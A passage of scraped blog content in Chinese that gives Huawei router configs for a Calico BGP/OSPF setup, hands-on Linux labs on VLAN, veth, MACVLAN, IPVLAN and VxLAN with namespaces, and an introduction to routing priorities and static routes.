trunk\rport trunk allow-pass vlan 10 20 30\rinterface GigabitEthernet0/0/2\rport link-type trunk\rport trunk allow-pass vlan 10 20 30\rinterface GigabitEthernet0/0/3\rport link-type trunk\rport trunk allow-pass vlan 10 20 30\r配置路由器间的ospf\ninterface l0\rip address 1.1.1.1 32\rquit\rospf router-id 1.1.1.1\rarea 0\rnetwork 1.1.1.1 0.0.0.0\rnetwork 10.0.0.253 0.0.0.0\rdis this\rinterface l0\rip address 2.2.2.2 32\rquit\rospf router-id 2.2.2.2\rarea 0\rnetwork 2.2.2.2 0.0.0.0\rnetwork 10.0.0.254 0.0.0.0\rdis this\r配置两个k8s节点与路由器之间的bgp\nsystem-view\rsysname R1\rinterface GigabitEthernet0/0/0\rip address 10.0.0.253 24\rdis this\rquit\rbgp 64512\rrouter-id 10.0.0.253\rpeer 10.0.0.5 as-number 64512\rpeer 10.0.0.5 reflect-client\rdis ip interface brief\rsystem-view\rsysname R2\rinterface GigabitEthernet0/0/0\rip address 10.0.0.254 24\rdis this\rquit\rbgp 63400\rrouter-id 10.0.0.254\rpeer 10.0.0.6 as-number 63400\rpeer 10.0.0.6 reflect-client\rdis ip interface brief\rbgp 64512\rrouter-id 10.0.0.253 peer 2.2.2.2 as-number 63400\rbgp 63400\rrouter-id 10.0.0.254\rpeer 1.1.1.1 as-number 64512\r","permalink":"https://www.oomkill.com/2021/01/calico-network-cni/","summary":"","title":"calico network cni网络方案"},{"content":"Overview 本文将介绍Kubernetes中使用的相关虚拟网络功能，目的是为了任何无相关网络背景经历的人都可以了解这些技术在kubernetes中式如何应用的。\nVLAN VLAN (Virtual local area networks)是逻辑上的LAN而不受限于同一物理网络交换机上。同样的VLAN也可以将同一台交换机/网桥下的设备/划分为不同的子网。\nVLAN 区分的广播域的标准是VLAN ID，此功能是Linux内核3.8中引入的\n在Linux中创建一个VLAN\nip link add link eth0 name eth0.2 type vlan id 2 VETH [1] VETH (Virtual Ethernet device)，是一个本地的以太网隧道，创建出的设备是成对的，通常会存在两个名称空间内，例如在docker中创建出的设备一端在root名称空间内，一端被挂在到容器的名称空间内。\n图：veth topology Source：https://medium.com/@arpitkh96/basics-of-container-networking-with-linux-part-1-3a3cdc64c87a\nip link add \u0026lt;p1-name\u0026gt; type veth peer name \u0026lt;p2-name\u0026gt; Bridge 目的 Linux bridge（又称为网桥、VLAN交换机）是Linux内核中集成的功能，用来做tcp/ip做二层协议交换的设备，虽然是软件实现的，但它与普通的二层物理交换机功能一样。bridge 就是为了解决虚拟机网卡连接问题。可以添加若干个网络设备到 bridge 上作为其接口，添加到 bridge 上的设备被设置为只接受二层数据帧并且转发所有收到的数据包到 bridge 中。\n由于 Linux bridge 是二层设备，故数据包是根据MAC地址而不是IP转发的。因此所有协议都可以透明地通过网桥。Linux bridge 广泛用于虚拟机，名称空间等。\n图：Linux Bridge Source：https://kbespalov.medium.com/linux-linux-bridge-7e0e887edd01\nMACVLAN [2] MACVLAN 允许在一个物理接口创建多个子接口，并且每个子接口都拥有一个随机生成的MAC地址，与IP地址。\nMACVLAN 中子接口不能与与父接口直接通讯，例如在虚拟化环境中，容器是不能ping通宿主机的IP，如果子接口需要和父接口进行通讯，需要将子接口分配给父接口。\n图：MACVLAN Source：https://hicu.be/bridge-vs-macvlan\n从 Linux 内核3.0起，MAC已经是linux内核中的一部分。\n查看内核是否加载 lsmod | grep macvlan\n加载macvlan模块 modprobe macvlan\n如果需要每次启动时都加载该模块，echo \u0026quot;macvlan\u0026quot; \u0026gt;\u0026gt; /etc/modules\nMACVLAN的限制 限制：\n使用MACVLAN技术需要开启网卡的混杂模式 授予NIC支持的MAC数量限制，超出限制会影响性能 MACVLAN不能工作在wireless网络环境中 [3] MACVLAN的模式 MACVLAN又五种类型：\nPrivate VEPA Bridge Passthru Source Private mode Private模式下的同一物理接口下的子接口将不允许通讯，即使物理设备支持hairpin也不行。\n图：MACVLAN Private mod Source：https://hicu.be/bridge-vs-macvlan\nhairpin 有多个名称，U-turn NAT, NAT loopback，实际上就是一种网络转换，在一个网络中的两个设备使用外部IP进行通讯。在MACVLAN这个例子中，veth1发往veth2的流量通过外部设备switch进行一个回转，这个行为称为为 hairpin turn。从上图也可以看出，是一个U形的转换。\nVPEA mode VPEA 将会将来自子接口的通过父接口转发，这将要求物理交换机需要支持 hairpin\n图：MACVLAN VPEA mode Source：https://hicu.be/bridge-vs-macvlan\nBridge mode Bridge 是指父接口与所有子接口是通过网桥相连的，因为连接在网桥上，不需要学习MAC地址。这也是容器网络中常用到的模式\n图：MACVLAN bridge mode Source：https://hicu.be/bridge-vs-macvlan\nPassthru passthru 是 pass through，由名字也可以得知，是指允许单个VM与物理接口连接。\n图：MACVLAN passthru mode Source：https://hicu.be/bridge-vs-macvlan\nSource 这个模式是Linux中的一个 Patch，是流量仅允许被允许的MAC地址列表\nIPVLAN IPVLAN与MACVLAN类似，只有一个不同的地方是，IPVLAN所有的MAC地址都是一样的，就是使用相同的MAC地址去创建子接口。\n图：IPVLAN Source：https://hicu.be/bridge-vs-macvlan\nIPVLAN modes 在使用IPVLAN时，只能选择下面两种模式中的一种，选择后，所有的子节接口将工作在这个模式下。\nL2 IPVLAN L2模式与 MACVLAN 的 brigde 模式工作原理很相似，父接口是作为交换机的角色，同一个物理接口上的子接口可以通过父接口来转发数据，而如果要发送数据到其他的网络，报文则会通过父接口的路由转发出去。\n图：IPVLAN L2 Source：https://hicu.be/bridge-vs-macvlan\nNotes: IPVLAN 是 linux kernel 比较新的特性，linux kernel 3.19 开始支持 ipvlan，但是比较稳定推荐的版本是 \u0026gt;=4.2\nL3 在 L3 模式下也就是 物理接口 是作为路由器，这种情况下就要求子接口之间需要处在不同子网中才可以。因为广播域是 L2 的，所以 IPVLAN L3 不支持多播和广播。\n图：IPVLAN L3 Source：https://hicu.be/bridge-vs-macvlan\nIPVLAN与MACVLAN如何选择 在于MACVLAN在wireless环境中的不友好，wireless选择 IPVLAN 对于外部设备有MAC地址限制的，或者混杂模式限制NIC性能 VxLAN VxLAN Introduction VxLAN (Virtual eXtensible Local Area Network) 是一种 MAC-over-IP 或者称为 UDP隧道机制，本质上来说是使用网络隧道技术将L3网络扩展为一个L2网络。\n为什么将 VxLAN 视为L2网络呢？ 虽说 VxLAN 是将L2的以太网帧封装到UDP报文中（L2 over L4）中，并在L3网络中传输。但是 VxLAN 最终是基于 MAC 地址的二层网络（可以无需路由设备），而不像 IPIP 的隧道技术网络通讯是基于路由的。\n下图是一个使用 VxLAN 技术的网络拓扑，整个篮筐部分可以视为一个二层的虚拟交换机，连接的各设备都可以直连。\n图：VXLAN tunneling technology Source：https://support.huawei.com/enterprise/en/doc/EDOC1100086966\nVNI VNI (VXLAN Network Identifier) 是类似于VLAN ID的标识符，不同的VNI 之间不能进行二层通讯\nVEPT VTEP (VxLAN tunnel endpoint) 是指数据包封包与解包的实体，VTEP 既可以是一台独立的网络设备，也可以是一个基于软件的虚拟交换机。当源服务器发出包时，会在 VTEP 上封装成 VxLAN 格式的报文；当传送到对端时，会在对端的 VTEP 进行解包\n下图是一个VxLAN网络拓扑图，其中建立隧道的两端就是 VTEP，这里的 VTEP 是两台 TOR 交换机，通过两个 VTEP 来对数据包的解封装。\n图：VXLAN network model Source：https://support.huawei.com/enterprise/en/doc/EDOC1100086966\n下图是Linux VxLAN 类型的网络拓扑，VTEP 可以理解为是一种网络接口，通过该接口与内核功能进行解封包，而实际的流量也是通过物理设备进行传输。\n图：VxLAN in Linux Preliminary knowledge 三层分级网络 [4] 三层分级网络? 思科的三层分级网络(three-layer hierarchical model) 包含三层：\n核心层 (Core)：网络骨干，提供不同分布层之间的高速连接和最优传送路径 分布层 (distribution) 将连接接入层到核心层，并且实施安全，流量负载和路由相关的策略 接入层 (access) 为用户终端初始网络的接入点。 图：three-layer hierarchical model Source：https://community.fs.com/blog/how-to-choose-the-right-distribution-switch.html\n为什么需要VxLAN [5] 下图是一个 CSP (Cloud Service Provider ) 的 DC 网络，\n接入层：48口交换机20个 分布层：两台分布式交换机，共同组成一个虚拟化交换机。默认网关位于分布式交换机中。 核心层：两个核心交换机 Notes：工作在分布层的交换机被称为分布式交换机 (Distribution Switch)，分布式交换机会将来自访问层的流量转发至核心层，并提供一些连接策略。\n每台接入交换机连接48台物理服务器。这些服务器中的每一个都包含五个不同的租户，它们拥有自己的虚拟路由 (VRF)。一个租户由三个广播域组成：Presiontation， Application 和 Database ，每层都是互备的。在管理租户时，可以定义 VLAN ID、虚拟机的 MAC 地址和 IP 地址。虚拟机时可移动的，存在如下信息：\n图：CSP DC network Source：https://nwktimes.blogspot.com/2018/02/vxlan-part-i-why-vxlan-is-needed.html\n通过上述信息可以得知有如下：\n服务器：$20\\times48=960$, 20为ToR交换机数量，48为每个ToR的接口 虚拟机/MAC地址/ARP：28800个虚拟机（每个物理机30个虚拟机） 广播域：每个租户+每个租户的VLAN+所拥有的物理机，$5\\times3\\times960=14400$ VRF：4800，5个租户+960个虚拟机 在这种网络中存在的挑战如下：\nVLAN ID的限制，通常来说VLAN ID只有12位，4096个，这意味着不够用 多租户，多租户场景下，广播域等都是用户自己定义的，此时可能发生客户定义的ID为相同的 MAC表大小限制，在一个租户下有28800个机器，意味着交换机MAC地址表存放28800个MAC地址。会出现老化过程。（Notes：Cisco Nexus 9500/9300 系列支持90000个MAC地址表） APR表大小限制，分布式交换机中存在超过28800条MAC-IP的数量（ Notes：Cisco Nexus 9500系列交换机支持 60,000 个 IPv4 ARP 和 30,000 个 IPv6 ND） 生成树协议，在这种网络拓扑结构下，由于 STP 不支持链路之间的负载均衡，因此某些链路可能不会用于流量传输，这种情况下使带宽利用率下降。 由于 VxLAN 通过L3建立隧道，因此不需要生成树协议。在基于 VxLAN 技术的 DC 中，VLAN将不再具有意义，因为 VLAN 是交换机甚至交换机端口特定的。\n在基于 VxLAN Leaf-Spine 的网络架构中，通过将网络压缩为一个L2的网络架构，所有的节点在访问其他节点时，都将仅需要两部，因此除了Leaf交换机之外，其余并不清楚虚拟机的MAC地址。\n下图是Leaf-Spine网络拓扑图， 在该架构中，每个较低级别的接入（leaf）交换机都以全网状连接到每个较高级别的核心（spine）交换机。\n图：spine-leaf network Source：https://www.datacenterdynamics.com/en/marketwatch/spine-and-leaf-network-architecture-explained/\nVxLAN in Linux Linux 对 VxLAN 协议的支持时间并不久，2012 年 Stephen Hemminger 才把相关的工作合并到 kernel 中，并最终出现在 kernel 3.7.0 版本。为了稳定性和很多的功能，你可以会看到某些软件推荐在 3.9.0 或者 3.10.0 以后版本的 kernel 上使用 vxlan。\nlinux实现VxLAN网络 两台机器构成一个VxLAN网络，每台机器上有一个 VTEP，VTEP 通过它们的 IP 互相通信。\n图：VxLAN in Linux 这个图创建的VxLAN0设备模拟了VTEP隧道端点，实现了一个大二层域，突破了虚拟化网络的物理界限。\nnode01\nip link add vxlan1 type vxlan id 1 remote 10.0.0.3 dstport 4789 dev ens33 ip link set vxlan1 up ip addr add 192.168.100.1/24 dev vxlan1 node02\nip link add vxlan1 type vxlan id 1 remote 10.0.0.14 dstport 4789 dev eth0 ip link set vxlan1 up ip addr add 192.168.100.2/24 dev vxlan1 上述命令创建了一个类型为vxlan，名为vxlan1的网络接口，期后面的为配置这个网络设备的内容：\nid 1 类似CE设备的vxlan vni 10 设置的桥接域，只有相同的VNI之间可以直接进行二层通信。 dstport VTEP 通信的端口，这里会监听一个udp端口 remote 10.0.0.3 类似vni 10 head-end peer-list 2.2.2.2 用来设置隧道对端的 VTEP 地址，因为这里使用的为单播模式。 local 10.0.0.4 与 dev eth0 类似于 source 1.1.1.1 配置源VTEP的IP地址。 $ tcpdump -np -i vxlan1 -vv tcpdump: listening on vxlan1, link-type EN10MB (Ethernet), snapshot length 262144 bytes 05:07:20.589942 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 192.168.100.1 tell 192.168.100.2, length 28 05:07:20.589963 ARP, Ethernet (len 6), IPv4 (len 4), Reply 192.168.100.1 is-at ca:21:c6:01:f9:d5, length 28 05:07:20.590509 IP (tos 0x0, ttl 64, id 26921, offset 0, flags [DF], proto ICMP (1), length 84) 192.168.100.2 \u0026gt; 192.168.100.1: ICMP echo request, id 1225, seq 1, length 64 05:07:20.590525 IP (tos 0x0, ttl 64, id 1264, offset 0, flags [none], proto ICMP (1), length 84) 192.168.100.1 \u0026gt; 192.168.100.2: ICMP echo reply, id 1225, seq 1, length 64 05:07:21.593791 IP (tos 0x0, ttl 64, id 27468, offset 0, flags [DF], proto ICMP (1), length 84) 抓包查看对应的数据包 [vxlan_linux.cap](......\\images\\vxlan in linux\\vxlan_linux.cap)\n清理数据\nip link set vxlan1 down ip link delete vxlan1 多播模式的 vxlan “多播”即“多点传送”(multicast)，也就是一台主机发出的包可以同时被其他多个有资格的主机接收，这台主机和那些有资格的主机就形成了一个组，他们在组内的通信是广播式的。多播的工作原理是，将一个网络上的某些主机的网卡设置成多播传送工作模式，指定其不过滤以某一个多播传送地址作为目的物理地址的数据帧，这样，这些主机的驱动程序中就可以同时接收以该多播传送地址作为目的物理地址的数据帧，而其他主机的驱动程序却接收不到，这些主机在逻辑上便形成了一个“多播”组。采用这种技术，相对广播而言，可有效减轻网络上“多播”组之外的其他主机的负担，因为发送给“多播”组的数据不会被传送到它们的驱动程序中去处理，避免资源的无谓浪费。\n多播的IP范围为：从224.0.0.0到239.255.255.255。能够接收发往一个特定多播组地址数据的主机集合称为主机组 (host group)。一个主机组可跨越多个网络。主机组中成员可随时加入或离开主机组。主机组中对主机的数量没有限制，同时不属于某一主机组的主机可以向该组发送信息。\n239.1.1.1 IIANA保留地址用于多播（多点传送）的IP，其mac地址为 01:00:5e:01:01:01(参考：组播地址)\n要组成同一个 vxlan 网络，vtep 必须能感知到彼此的存在。多播组本来的功能就是把网络中的某些节点组成一个虚拟的组。\n实验使用的为多播组组成一个虚拟的整体，通过多播组，组成可容纳多个主机组成 vxlan 网络\n图：muticast VxLAN in Linux ip link add vxlan2 type vxlan id 10 group 239.1.1.1 dstport 4789 dev eth0 ip link set vxlan2 up ip addr add 192.168.100.10/24 dev vxlan2 node01\nip link add vxlan2 type vxlan id 10 group 239.1.1.1 dstport 4789 dev eth0 ip link set vxlan2 up ip addr add 192.168.100.20/24 dev vxlan2 FDB 是 Linux 网桥维护的一个二层转发表，用于保存远端虚拟机/容器的 MAC地址，远端 VTEP IP，以及 VNI 的映射关系，可以通过 bridge fdb 命令来对 FDB 表进行操作：\nvxlan接口在创建后，fdb只有一个表项，就是所有vxlan2的流量都发往多播组\n$ bridge fdb 33:33:00:00:00:01 dev eth0 self permanent 01:00:5e:00:00:01 dev eth0 self permanent 01:00:5e:01:01:01 dev eth0 self permanent 00:00:00:00:00:00 dev vxlan2 dst 239.1.1.1 via eth0 self permanent 组播路由方式过程\n当发送ping 192.168.100.10时在同一个局域网内会先发送ARP广播，为组播方式，node1与node2（10.0.0.4）均受到广播，而node3（10.0.0.6）未受到 ARP报文要获得的内容为vxlan的mac地址，目的地址为全1的广播地址 vxlan隧道封装VNI=10，因为不知道目的地址，所以会发送多播报文 受到报文后进行解包，取出真实的报文，如果发现是自己的，经由隧道封装后传递 vtep 通过源报文学习到了 vtep 所在的主机，因此会直接单播发送给目的 vtep。发送方主机根据 VNI 把报文转发给 vtep，vtep 解包取出 ARP 应答报文，添加 arp 缓存到内核。并根据报文学习到目的 vtep 所在的主机地址，添加到 fdb 表中 而没在多播组中的同网段主机没有受到对应的ARP广播\n而在加入多播组中会受到多播的信息，确定不是自己后没有reply\n此实验的报文内容\n[192.168.10.30 加入同多播组](......\\images\\vxlan in linux\\10.30.cap)\n[192.168.10.20 发起端](......\\images\\vxlan in linux\\10.20.cap)\n[192.168.10.30 不在多播组内的报文](......\\images\\vxlan in linux\\10.30 exit multicast.cap)\n清除配置\nip link set vxlan2 down ip link delete vxlan2 实验一：Linux Bridge[L2] 该实验包含 veth, vlan, Linux bridge 方面的\n图：L2 vn topology\n加载vlan模块\nmodprobe 8021q ## 查看核心是否提供VLAN 功能 dmesg | grep -i 802 [ 1.592802] pci 0000:00:15.0: PME# supported from D0 D3hot D3cold [ 1755.995461] 8021q: 802.1Q VLAN Support v1.8 [ 1755.995485] 8021q: adding VLAN 0 to HW filter on device eth0 安装命令\nyum install vconfig -y apt install vlan 创建vlan\n# 创建bridge brctl addbr vlan10 brctl show ip link add veth01 type veth peer name eth01 ip link add veth02 type veth peer name eth02 # 将veth对的一端加入网桥 brctl addif vlan10 veth01 brctl addif vlan10 veth02 # 启动对应设备 ip link set dev vlan10 up ip link set dev veth01 up ip link set dev veth02 up ip link set dev eth01 up ip link set dev eth02 up # 创建ns ip netns add net1 ip netns add net2 # 将veth关联到对应名称空间内 ip link set eth01 netns net1 ip link set eth02 netns net2 网络名称空间net1内的操作，在vlan一端添加接口，与关联到该名称空间内的 veth 关联\nvconfig add eth01 3001 vconfig add eth01 3002 ip link set eth01 up ip link set eth01.3001 up ip link set eth01.3002 up ip addr add 192.168.100.1/24 dev eth01.3001 ip addr add 192.168.100.2/24 dev eth01.3002 网络名称空间net2与net1的类似\nvconfig add eth02 3001 vconfig add eth02 3002 ip link set dev eth02 up ip link set dev eth02.3001 up ip link set dev eth02.3002 up ip addr add 192.168.100.10/24 dev eth02.3001 ip addr add 192.168.100.11/24 dev eth02.3002 验证连通性，可以看到发送的包带有tag的标签\n实验二：IPVLAN L2 实验结果，通过namespace模拟Pod的网络，做到各Pod间的网络通讯。\nip netns list 查看网络命名空间\nip netns add net2 创建一个网络命名空间\nip link add \u0026lt;name\u0026gt; link eth0 type ipvlan mode l2 在当前名称空间创建一个类型为IPVLAN L2模式的接口，将该接口关联至父接口eth0上。\nip link set $name netns $nsName 将接口加入到对应网络名称空间内\nip netns exec $nsName $cmd 在对应的网络名称空间内运行命令\n创建两个网络名称空间\n$ ip netns add net1 $ ip netns add net2 $ ip netns list net2 net1 创建 IPVLAN 接口\n$ ip link add ipvlan01 link eth0 type ipvlan mode l2 $ ip link add ipvlan02 link eth0 type ipvlan mode l2 $ ip link set ipvlan01 netns net1 $ ip link set ipvlan02 netns net2 给对应接口添加IP地址\nip netns exec net1 ifconfig ipvlan01 192.168.0.1/24 up ip netns exec net2 ifconfig ipvlan02 192.168.0.2/24 up # 这两个名称空间内的mac地址是一样的 $ ip netns exec net2 ifconfig ipvlan02: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.0.2 netmask 255.255.255.0 broadcast 192.168.0.255 inet6 fe80::da78:c800:27a:fb26 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether da:78:c8:7a:fb:26 txqueuelen 1000 (Ethernet) RX packets 39007 bytes 2394577 (2.2 MiB) RX errors 0 dropped 27 overruns 0 frame 0 TX packets 11 bytes 866 (866.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 $ ip netns exec net1 ifconfig ipvlan01: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.0.1 netmask 255.255.255.0 broadcast 192.168.0.255 inet6 fe80::da78:c800:17a:fb26 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether da:78:c8:7a:fb:26 txqueuelen 1000 (Ethernet) RX packets 132823 bytes 8184548 (7.8 MiB) RX errors 0 dropped 93 overruns 0 frame 0 TX packets 12 bytes 936 (936.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 测试两个名称空间是否互通\n结论：可以看到两个名称空间内的子接口 (sub-interface) 通过其父接口 (parent-interface) 可以达到互通。子接口与父接口之间的不互通。IPVLAN L2模式仅限于子接口之间的互通\n$ ip netns exec net1 ping 192.168.0.2 PING 192.168.0.2 (192.168.0.2) 56(84) bytes of data. 64 bytes from 192.168.0.2: icmp_seq=1 ttl=64 time=0.285 ms 64 bytes from 192.168.0.2: icmp_seq=2 ttl=64 time=0.077 ms ^C --- 192.168.0.2 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1027ms rtt min/avg/max/mdev = 0.077/0.181/0.285/0.104 ms $ ip netns exec net2 ping 192.168.0.1 PING 192.168.0.1 (192.168.0.1) 56(84) bytes of data. 64 bytes from 192.168.0.1: icmp_seq=1 ttl=64 time=0.051 ms 64 bytes from 192.168.0.1: icmp_seq=2 ttl=64 time=0.059 ms ^C --- 192.168.0.1 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1056ms rtt min/avg/max/mdev = 0.051/0.055/0.059/0.004 ms 遇到问题\nRTNETLINK answers: Operation not supported： CentOS 7默认内核版本为3.10 IPVLAN 3.19开始支持，推荐内核为4.2+\n子接口ping父接口不通，源MAC与目标MAC是一致，而mac接口是mac地址与接口绑定，因为三个接口的mac地址都相同，此时区分不了是哪个接口。\nping公网地址不通，查看路由表中没有对外的路由，手动添加即可\nip netns exec net1 route -n ip netns exec net1 route add -net 0.0.0.0/0 gw 10.0.0.2 IPVLAN L2模式中，父接口是可以没有IP地址的。不影响子接口的使用\n清除所有网络名称空间\nfor n in $(ip netns list|awk '{print $1}');do ip netns del $n;done 实验三：IPVLAN L3 先创建两个用做测试的 network namespace\nip netns add net3 ip netns add net4 创建出 IPVLAN 的虚拟网卡接口，创建 IPVLAN 虚拟接口的命令和 MACVLAN 格式相同：\nip link add ipvl01 link ens33 type ipvlan mode l3 ip link add ipvl02 link ens33 type ipvlan mode l3 把 IPVLAN 接口放到前面创建好的 namespace 中\nip link set ipvl01 netns net3 ip link set ipvl02 netns net4 # 给对应设备设置IP地址 ip netns exec net3 ifconfig ipvl01 192.168.10.1/24 up ip netns exec net4 ifconfig ipvl02 192.168.20.1/24 up # 设置对应的路由 ip netns exec net4 route add -net 192.168.10.0/24 dev ipvl02 ip netns exec net3 route add -net 192.168.20.0/24 dev ipvl01 结果是可以通的\n$ ip netns exec net3 ping 192.168.20.1 PING 192.168.20.1 (192.168.20.1) 56(84) bytes of data. 64 bytes from 192.168.20.1: icmp_seq=1 ttl=64 time=0.026 ms 64 bytes from 192.168.20.1: icmp_seq=2 ttl=64 time=0.119 ms ^C --- 192.168.20.1 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1028ms rtt min/avg/max/mdev = 0.026/0.072/0.119/0.046 ms 实验四：MACVLAN 创建两个名称空间\nip netns add net1 ip netns add net2 创建两个 MACVLAN 接口\nip link add link eth0 name macv1 type macvlan mode bridge ip link add link eth0 name macv2 type macvlan mode bridge ## 持久化创建 echo \u0026quot;ip link add eth0 eth0.1 address 52:54:00:cc:ee:aa link enp0s31f6 type macvlan\u0026quot; \u0026gt; /sbin/ifup-pre-local2 把 MACVLAN 接口放到前面创建好的 namespace 中\nip link set macv1 netns net1 ip link set macv2 netns net2 # 给对应设备设置IP地址 ip netns exec net1 ifconfig ipvl01 192.168.10.1/24 up ip netns exec net2 ifconfig ipvl02 192.168.20.1/24 up # 设置对应的路由 ip netns exec net1 route add -net 192.168.10.0/24 dev ipvl02 ip netns exec net2 route add -net 192.168.20.0/24 dev ipvl01 可以看到两个网卡的MAC地址是不同的\n$ ip netns exec net2 ifconfig macv2: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.10.1 netmask 255.255.255.0 broadcast 192.168.10.255 inet6 fe80::a830:c9ff:fe9a:7c33 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether aa:30:c9:9a:7c:33 txqueuelen 1000 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 7 bytes 586 (586.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 $ ip netns exec net1 ifconfig macv1: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.10.1 netmask 255.255.255.0 broadcast 192.168.10.255 inet6 fe80::d448:c5ff:fec7:76a3 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether d6:48:c5:c7:76:a3 txqueuelen 1000 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 8 bytes 656 (656.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 Reference [1] man veth\n[2] macvlan\n[3] how to configure macvlan interface for getting the IP?\n[4] distribution switch\n[5] why vxlan is needed\n[4] distribution switch\n","permalink":"https://www.oomkill.com/2021/01/virtual-networking/","summary":"","title":"Linux虚拟网络技术"},{"content":"在因特网中，网络连接设备用来控制网络流量和保证网络数据传输质量。常见的网络连接设备有集线器（Hub）、网桥（Bridge）、交换机（Switch）和路由器（Router）。\n路由器是一种典型的网络连接设备，用来进行路由选择和报文转发。路由器根据收到报文的目的地址选择一条合适的路径（包含一个或多个路由器的网络），然后将报文传送到下一个路由器，路径终端的路由器负责将报文送交目的主机。\n路由（routing）就是报文从源地址传输到目的地址的活动。路由发生在OSI网络参考模型中的第三层即网络层。当报文从路由器到目的网段有多条路由可达时，路由器可以根据路由表中最佳路由进行转发。最佳路由的选取与发现此路由的路由协议的优先级、路由的度量有关。当多条路由的协议优先级。\n路由是数据通信网络中最基本的要素。路由信息就是指导报文发送的路径信息，路由的过程就是报文转发的过程。\n根据路由目的地的不同，路由可划分为：\n网段路由：目的地为网段，IPv4地址子网掩码长度小于32位或IPv6地址前缀长度小于128位。\n主机路由：目的地为主机，IPv4地址子网掩码长度为32位或IPv6地址前缀长度为128位。\n根据目的地与该路由器是否直接相连，路由又可划分为：\n直连路由：目的地所在网络与路由器直接相连。\n间接路由：目的地所在网络与路由器非直接相连。\n根据目的地址类型的不同，路由还可以分为：\n单播路由：表示将报文转发的目的地址是一个单播地址。\n组播路由：表示将报文转发的目的地址是一个组播地址。\n路由的优先级 对于相同的目的地，不同的路由协议（包括静态路由）可能会发现不同的路由，但这些路由并不都是最优的。事实上，在某一时刻，到某一目的地的当前路由仅能由唯一的路由协议来决定。为了判断最优路由，各路由协议（包括静态路由）都被赋予了一个优先级，当存在多个路由信息源时，具有较高优先级（取值较小）的路由协议发现的路由将成为最优路由，并将最优路由放入本地路由表中。\n路由协议 优先级 DIRECT 0 OSPF 10 IS-IS IS-IS Level1 15\nIS-IS Level 2 由网关加入的路由 50 路由器发现的路由 55 静态路由 60 UNR（User Network Route） DHCP（Dynamic Host Configuration Protocol）：60AAA-Download：60IP Pool：61Frame：62Host：63NAT（Network Address Translation）：64IPSec（IP Security）：65NHRP（Next Hop Resolution Protocol）：65PPPoE（Point-to-Point Protocol over Ethernet）：65 Berkeley RIP 100 点对点接口聚集的路由 110 OSPF的扩展路由 140 OSPF ASE 150 OSPF NSSA 150 BGP 170 EGP 200 IBGP 255 EBGP 255 其中，0表示直接连接的路由，255表示任何来自不可信源端的路由；数值越小表明优先级越高。 除直连路由（DIRECT）外，各种路由协议的优先级都可由用户手工进行配置。另外，每条静态路由的优先级都可以不相同。 路由器根据路由转发数据包，路由可通过手动配置和使用动态路由算法计算产生，其中手动配置的路由就是静态路由。\n静态路由比动态路由使用更少的带宽，并且不占用CPU资源来计算和分析路由更新。但是当网络发生故障或者拓扑发生变化后，静态路由不会自动更新，必须手动重新配置。静态路由有5个主要的参数：目的地址、掩码、出接口、下一跳、优先级。\n目的地址和掩码: IPv4的目的地址为点分十进制格式，掩码可以用点分十进制表示，也可用掩码长度（即掩码中连续‘1’的位数）表示。当目的地址和掩码都为零时，表示静态缺省路由。\n出接口和下一跳地址: 在配置静态路由时，根据不同的出接口类型，指定出接口和下一跳地址。\n对于点到点类型的接口，只需指定出接口。因为指定发送接口即隐含指定了下一跳地址，这时认为与该接口相连的对端接口地址就是路由的下一跳地址。\n对于NBMA（Non Broadcast Multiple Access）类型的接口（如ATM接口），配置下一跳IP地址。因这类接口支持点到多点网络，除了配置静态路由外，还需在链路层建立IP地址到链路层地址的映射，这种情况下，不需要指定 出接口。\n对于广播类型的接口（如以太网接口）和VT（Virtual-template）接口，必须指定通过该接口发送时对应的下一跳地址。因为以太网接口是广播类型的接口，而VT接口下可以关联多个虚拟访问接口（Virtual Access Interface），这都会导致出现多个下一跳，无法唯一确定下一跳。\n静态路由优先级 对于不同的静态路由，可以为它们配置不同的优先级，优先级数字越小优先级越高。配置到达相同目的地的多条静态 路由，如果指定相同优先级，则可实现负载分担；如果指定不同优先级，则可实现路由备份。\n实验： 在eNsp实现静态路由配置 通信是双向的，因此要留意往返流量（的路由）。\n路由的行为是逐跳的，因此需保证沿途的每一台路由器都有路由\n\u0026lt;Huawei\u0026gt;system-view [Huawei]sysname ar1\r[ar1]interface g0/0/0\r[ar1-GigabitEthernet0/0/0]ip address 192.168.10.1 24\rJan 23 2021 20:52:30-08:00 ar1 %%01IFNET/4/LINK_STATE(l)[0]:The line protocol IP\ron the interface GigabitEthernet0/0/0 has entered the UP state. [ar1-GigabitEthernet0/0/0]dis this\r[V200R003C00]\r#\rinterface GigabitEthernet0/0/0\rip address 192.168.10.1 255.255.255.0 #\rreturn\r[Huawei-GigabitEthernet0/0/1]display ip interface brief *down: administratively down\r^down: standby\r(l): loopback\r(s): spoofing\rThe number of interface that is UP in Physical is 3\rThe number of interface that is DOWN in Physical is 0\rThe number of interface that is UP in Protocol is 3\rThe number of interface that is DOWN in Protocol is 0\rInterface IP Address/Mask Physical Protocol GigabitEthernet0/0/0 192.168.20.1/24 up up GigabitEthernet0/0/1 192.168.30.1/24 up up NULL0 unassigned up up(s) # 查看所有路由\rdis ip routing-table\r# 删除命令\rundo ip address 192.168.10.1 255.255.255.0 # 查看bgp协议路由\rdis ip routing-table\r# 设置静态路由\rip routing-static 192.168.0.0 24 192.168.1.1\r# 保存配置命令 \u0026lt;用户模式\u0026gt; 